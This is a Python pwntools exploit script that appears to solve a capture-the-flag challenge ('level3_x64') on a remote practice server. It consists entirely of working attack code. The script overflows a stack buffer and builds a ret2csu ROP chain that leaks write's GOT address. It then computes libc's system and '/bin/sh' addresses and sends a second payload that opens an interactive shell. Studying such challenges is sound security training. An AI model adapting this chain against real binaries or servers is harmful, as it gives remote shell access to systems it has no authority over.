#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='amd64', os='linux')

ELF_IMG = './level3_x64'
# LIBC_IMG = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC_IMG = './libc-2.19.so'

# io = process(ELF_IMG)
io = remote('pwn2.jarvisoj.com', 9883)

elf = ELF(ELF_IMG)
libc = ELF(LIBC_IMG)

POP_RDI_ADDR = 0x4006b3
MOV_CALL_ADDR = 0x400690
POP_RBX_ADDR = 0x4006AA

OFFSET = 0x80
PADDING = 'a' * (OFFSET + 8)


# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;

payload = PADDING
# payload += p64(POP_RDI_ADDR)
# payload += p64(0)  # 清空rdi 
payload += p64(POP_RBX_ADDR)
payload += p64(0)  # -> pop rbx
payload += p64(1)  # -> pop rbp （rbp必须为1
payload += p64(elf.got['write'])  # -> pop r12
payload += p64(8)  # -> pop r13 -> rdx
payload += p64(elf.got['write'])  # -> pop r14 -> rsi
payload += p64(1)  # -> pop r15 -> edi
payload += p64(MOV_CALL_ADDR)  # ret -> MOV_CALL
payload += 'a' * 56  # ? (6 + 1) * 8
payload += p64(elf.symbols['vulnerable_function'])

print repr(payload)

# raw_input('wait')

io.sendlineafter(':\n', payload)

out = io.recv()

print repr(out)

write_got = u64(out[:8])

log.success('write_got = ' + hex(write_got))

system_got = libc.symbols['system'] - libc.symbols['write'] + write_got

log.success('system_got = ' + hex(system_got))

binsh = next(libc.search('/bin/sh')) - libc.symbols['write'] + write_got

log.success('binsh = ' + hex(binsh))

# raw_input('wait')

payload = PADDING
payload += p64(POP_RDI_ADDR)
payload += p64(binsh)
payload += p64(system_got)

io.sendline(payload)

io.interactive()
